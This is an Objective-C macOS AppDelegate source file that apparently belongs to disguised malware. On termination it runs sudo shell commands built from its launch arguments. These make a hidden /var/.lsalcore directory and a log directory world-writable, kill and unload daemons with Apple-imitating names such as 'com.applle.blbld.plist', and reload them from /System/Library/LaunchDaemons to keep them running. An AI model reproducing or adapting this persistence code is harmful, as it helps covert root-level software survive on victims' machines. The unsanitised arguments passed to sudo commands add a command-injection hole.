#import "AppDelegate.h"

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)note {
    #pragma unused (note)
}

- (void)applicationWillTerminate:(NSNotification *)note {
    #pragma unused (note)
    
    /*
     No need to wait, otherwise system will kill this app before this method completed execution, tested on 10.10.2, 10.9.1
     */
    //[NSThread sleepForTimeInterval:5];
    
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    
    /*
     - arg0: /Library/PrivilegedHelperTools/.blbla/blbla/Contents/MacOS/blbla
     - arg1: com.applle.blbld.plist
     - arg2: blblu
     - arg3: blbld
     - arg4: com.applle.blblw.plist
     - arg5: blblw
     - arg6: /var/.lsalcore
     - arg7: /log
     */
    
    NSLog(@"blbla launching args : %@", args);
    
    // home directory
    NSString* charCmd = [NSString stringWithFormat:@"sudo chmod -R 777 %@",[args objectAtIndex:6]];
    system([charCmd UTF8String]);
    
    // log directory
    charCmd = [NSString stringWithFormat:@"sudo chmod -R 777 %@",[args objectAtIndex:7]];
    system([charCmd UTF8String]);
    
    // blbld
    charCmd = [NSString stringWithFormat:@"sudo launchctl stop %@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo launchctl remove %@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo killall %@",[args objectAtIndex:3]];
    system([charCmd UTF8String]);
    
    // blblw
    charCmd = [NSString stringWithFormat:@"sudo launchctl stop %@",[args objectAtIndex:4]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo launchctl remove %@",[args objectAtIndex:4]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo killall %@",[args objectAtIndex:5]];
    system([charCmd UTF8String]);
    
    // blblu
    charCmd = [NSString stringWithFormat:@"sudo killall %@",[args objectAtIndex:2]];
    system([charCmd UTF8String]);
    
    // launch blbld
    charCmd = [NSString stringWithFormat:@"sudo launchctl load /System/Library/LaunchDaemons/%@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    // launch blblw
    charCmd = [NSString stringWithFormat:@"sudo launchctl load /System/Library/LaunchDaemons/%@",[args objectAtIndex:4]];
    system([charCmd UTF8String]);
}

@end
